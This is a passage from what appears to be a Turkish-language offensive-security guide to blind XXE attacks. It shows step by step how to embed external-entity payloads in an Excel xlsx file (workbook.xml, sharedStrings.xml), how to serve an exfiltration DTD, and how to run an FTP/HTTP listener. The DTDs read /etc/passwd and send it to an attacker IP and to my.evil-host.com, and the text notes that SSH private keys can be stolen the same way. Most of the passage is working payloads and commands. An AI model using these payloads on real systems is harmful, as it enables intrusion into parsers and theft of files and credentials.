  <!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">
  %asd;
  %c;
]>
<cdl>&rrr;</cdl>

<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">

```

Yukarıda `xxe.dtd` adında remote olarak indirilecek bir DTD dosyasına referans var. Böylece dosyayı her test etmek istediğinde Excel dosyasını yeniden oluşturmak zorunda kalmazsın, sadece DTD dosyasını değiştirmen yeterli olur.

Alternatif: `xl/sharedStrings.xml` içine de eklenebilir

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [
  <!ELEMENT t ANY >
  <!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">
  %asd;
  %c;
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10">
  <si><t>&rrr;</t></si>
  <si><t>testA2</t></si>
  ...
</sst>
```

veya 

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```


3.  Dosyayı Yeniden Paketle

```
cd XXE
zip -r -u ../xxe.xlsx *
```

 **ÖNEMLİ:** `zip -u` kullan. `7z a` veya `7zz` **uyumsuz sıkıştırma algoritması** kullanabilir ve dosya Excel tarafından tanınmaz.

4.  Export DTD Dosyasını Oluştur

```
<!-- xxe.dtd -->
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
```

Bu dosya sunucudan çekildiğinde şunu yapar:

- `/etc/passwd` dosyasını alır
- FTP üzerinden senin IP’ne `rrr` entity’si ile yollar


5. FTP + HTTP Server'ı Kur

```
git clone https://github.com/staaldraad/xxeserv
cd xxeserv
python3 xxeserv.py -o files.log -p 2121 -w -wd public -wp 8000
```

Bu araç hem `DTD` dosyasını HTTP ile sunar hem de gelen `FTP` isteklerini dinleyip dosya verisini alır (örn. `/etc/passwd`).

- Hazırladığın `xxe.xlsx` dosyasını aç.
- Eğer `rrr` entity’si tetiklenirse, FTP server’a bağlanılır ve örneğin `/etc/passwd` FTP üzerinden aktarılır.


##### Dikkat Edilecekler

- Excel bazı durumlarda `DOCTYPE` yorumlarını yoksayabilir; farklı dosyalarda dene (örn. `sharedStrings.xml`).
- Blind XXE olduğu için doğrudan bir çıktı görmezsin. Payload sunucuya bağlandıysa dosya çalışmış demektir.
- DTD dosyası sayesinde tekrar `.xlsx` dosyasını değiştirmeden test yapılabilir.

- **FTP yerine HTTP** kullanırsan daha az veri alırsın çünkü HTTP’de query string uzunluk sınırı var.
- FTP ile büyük dosyalar da çalınabilir (örneğin `.ssh/id_rsa`).
- Bu yöntem sadece **XML parser**’ı düzgün çalışan uygulamalarda işe yarar.


### 99- XXE Inside DTD file (XXE DTD dosyası içinde)

Yukarıda ayrıntıları verilen XXE payload'larının çoğu hem DTD veya `DOCTYPE` bloğu hem de `xml` dosyası üzerinde kontrol gerektirir. Nadir durumlarda, yalnızca DTD dosyasını kontrol edebilir ve `xml` dosyasını değiştiremezsiniz. Örneğin, bir MITM. Kontrol ettiğiniz tek şey DTD dosyası olduğunda ve `xml` dosyasını kontrol etmediğinizde, bu payload ile XXE yine de mümkün olabilir.

```xml
<!-- Hassas bir dosyanın içeriğini bir değişkene yükleyin -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- URL'deki dosya içeriğiyle bir HTTP alma isteği oluşturmak için bu değişkeni kullanın -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
%param1;
%external;
```

| Satır                                             | Açıklama                                                                                                                                                                |
| ------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<!ENTITY % payload SYSTEM "file:///etc/passwd">` | `%payload` adında bir entity tanımlanıyor. İçeriği `file:///etc/passwd` olacak şekilde **local dosya sisteminden veri çekiliyor**.                                      |
| `<!ENTITY % param1 '...'>`                        | `%param1`, bir başka ENTITY tanımı oluşturuyor ama dikkat: `&#37;` → `%` karakterini temsil eder. Böylece `<!ENTITY % external SYSTEM "...">` XML parser’a tanıtılıyor. |
| `%param1;`                                        | Yukarıda tanımlanan `%param1` uygulanıyor. Parser şimdi gerçek bir ENTITY tanımı okuyor: `%external`                                                                    |
| `%external;`                                      | Son olarak, bu dış entity çağrılıyor: `http://my.evil-host.com/x=[DOSYA İÇERİĞİ]` ⇒ hedef sistem **senin sunucuna hassas veriyi HTTP ile gönderiyor.**                  |
